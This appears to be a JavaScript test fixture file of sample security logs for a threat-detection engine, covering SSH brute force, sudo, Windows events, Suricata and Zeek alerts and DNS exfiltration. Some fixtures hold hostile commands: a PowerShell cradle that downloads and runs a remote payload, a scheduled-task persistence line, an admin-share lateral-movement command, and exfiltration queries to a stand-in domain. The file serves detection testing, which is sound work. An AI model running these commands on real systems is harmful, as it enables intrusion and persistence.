// Realistic log samples used across the engine tests. These mirror the alerts
// shipped in the app's sample picker, so the tests exercise the same inputs a
// user actually clicks.
//
// Windows and UNC paths use String.raw so one backslash in this source is one
// backslash at runtime - the engine's lateral-movement rule matches on literal
// double-backslash UNC prefixes, and ordinary escaping made that unreadable.

export const SYSLOG_BRUTE_ROOT = `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:23 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:25 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:27 prod-server sshd[2341]: Failed password for admin from 185.220.101.45 port 52341 ssh2`;

export const SYSLOG_BRUTE_NONROOT = `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for deploy from 198.51.100.7 port 52341 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for deploy from 198.51.100.7 port 52342 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for deploy from 198.51.100.7 port 52343 ssh2`;

export const SYSLOG_SINGLE_FAIL =
  `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for deploy from 198.51.100.7 port 52341 ssh2`;

export const SYSLOG_INVALID_USER = `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for invalid user oracle from 203.0.113.9 port 111 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for invalid user oracle from 203.0.113.9 port 112 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for invalid user oracle from 203.0.113.9 port 113 ssh2`;

export const SYSLOG_SUDO =
  `Jan 15 10:04:22 prod-server sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash`;

export const WIN_POWERSHELL_MALICIOUS = String.raw`EventID: 4104
TimeCreated: 2024-01-15T14:23:11Z
Computer: DESKTOP-A7K2P
User: CORP\jsmith
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200/payload.ps1')
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand`;

export const WIN_POWERSHELL_BENIGN = String.raw`EventID: 4104
TimeCreated: 2024-01-15T14:23:11Z
Computer: DESKTOP-A7K2P
User: CORP\jsmith
ScriptBlockText: Get-ChildItem C:\Reports | Sort-Object LastWriteTime`;

export const WIN_FAILED_LOGON = String.raw`EventID: 4625
TimeCreated: 2024-01-15T09:10:00Z
Computer: FS01
User: CORP\svc_backup
LogonType: 3`;

export const WIN_LATERAL = String.raw`EventID: 4688
TimeCreated: 2024-01-15T09:10:00Z
Computer: WKSTN-14
User: CORP\jsmith
CommandLine: net use \\FS01\C$ /user:CORP\admin`;

export const WIN_PERSISTENCE = String.raw`EventID: 4688
TimeCreated: 2024-01-15T09:10:00Z
Computer: WKSTN-14
User: CORP\jsmith
CommandLine: schtasks /create /tn Updater /tr C:\ProgramData\updater.exe /sc onlogon`;

export const SURICATA_COBALT_STRIKE = `{
  "timestamp": "2024-01-15T10:33:21.123456+0000",
  "event_type": "alert",
  "src_ip": "10.0.0.22",
  "src_port": 54321,
  "dest_ip": "198.51.100.45",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "signature_id": 2019401,
    "signature": "ET MALWARE Possible Cobalt Strike Beacon Activity",
    "category": "Malware Command and Control Activity Detected",
    "severity": 1
  }
}`;

export const SURICATA_SCAN = `{
  "event_type": "alert",
  "src_ip": "203.0.113.50",
  "dest_ip": "10.0.0.10",
  "dest_port": 80,
  "alert": { "signature": "ET SCAN Nmap Scripting Engine probe", "category": "Attempted Information Leak", "severity": 3 }
}`;

export const SURICATA_EXPLOIT = `{
  "event_type": "alert",
  "src_ip": "203.0.113.77",
  "dest_ip": "10.0.0.80",
  "dest_port": 8080,
  "alert": { "signature": "ET EXPLOIT Apache Struts RCE attempt", "category": "Attempted Administrator Privilege Gain", "severity": 1 }
}`;

export const ZEEK_BEACON = `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CRBfPk1234abcd 10.0.0.55 49201 203.0.113.99 4444 tcp - 3600.00 2457600 1024 SF
1705276801.234567 CRBfPk5678efgh 10.0.0.55 49202 203.0.113.99 4444 tcp - 3601.00 2457700 1025 SF`;

// A short, small flow to a benign port. Nothing here should trip a threat rule.
export const ZEEK_BENIGN = `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CabcdE1234 10.0.0.55 49201 93.184.216.34 443 tcp ssl 0.42 1840 9120 SF`;

// Large upload over a short connection - exfiltration shape, not beaconing.
export const ZEEK_EXFIL = `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CzzzZ9999 10.0.0.55 49201 203.0.113.140 443 tcp ssl 120.00 84000000 4096 SF`;

// Same beacon flow with no #fields header - parser must fall back to the
// standard conn.log column order.
export const ZEEK_NO_HEADER =
  `1705276800.123456 CRBfPk1234abcd 10.0.0.55 49201 203.0.113.99 4444 tcp - 3600.00 2457600 1024 SF`;

export const CEF_MIMIKATZ =
  `CEF:0|Palo Alto Networks|PAN-OS|10.1|threat|THREAT|7|src=172.16.0.5 dst=203.0.113.10 spt=12345 dpt=80 proto=TCP act=block cs1=Mimikatz cs1Label=ThreatName deviceAction=block msg=Credential dumping tool detected rt=Jan 15 2024 08:22:11`;

export const DNS_EXFIL = `Timestamp: 2024-01-15T22:11:04Z
Source: 10.0.0.45
Query: aGVsbG93b3JsZA==.exfil.evilsite.xyz
Query: dGhpcyBpcyBhIHRlc3Q=.exfil.evilsite.xyz
Query: c2Vuc2l0aXZlZGF0YQ==.exfil.evilsite.xyz
Bytes_out: 48291
Unusual_subdomain_entropy: HIGH`;

export const NARRATIVE_LATERAL = String.raw`The analyst observed that the workstation connected to \\FS01\ADMIN$ and psexec was used to start a service on the file server around 02:00.`;

export const NARRATIVE_BENIGN =
  `A user called the service desk to report that their laptop is running slowly since this morning and asked whether a reboot would help.`;

/** Every fixture, for invariant tests that must hold across all inputs. */
export const ALL_FIXTURES = {
  SYSLOG_BRUTE_ROOT, SYSLOG_BRUTE_NONROOT, SYSLOG_SINGLE_FAIL, SYSLOG_INVALID_USER, SYSLOG_SUDO,
  WIN_POWERSHELL_MALICIOUS, WIN_POWERSHELL_BENIGN, WIN_FAILED_LOGON, WIN_LATERAL, WIN_PERSISTENCE,
  SURICATA_COBALT_STRIKE, SURICATA_SCAN, SURICATA_EXPLOIT,
  ZEEK_BEACON, ZEEK_BENIGN, ZEEK_EXFIL, ZEEK_NO_HEADER,
  CEF_MIMIKATZ, DNS_EXFIL, NARRATIVE_LATERAL, NARRATIVE_BENIGN
};
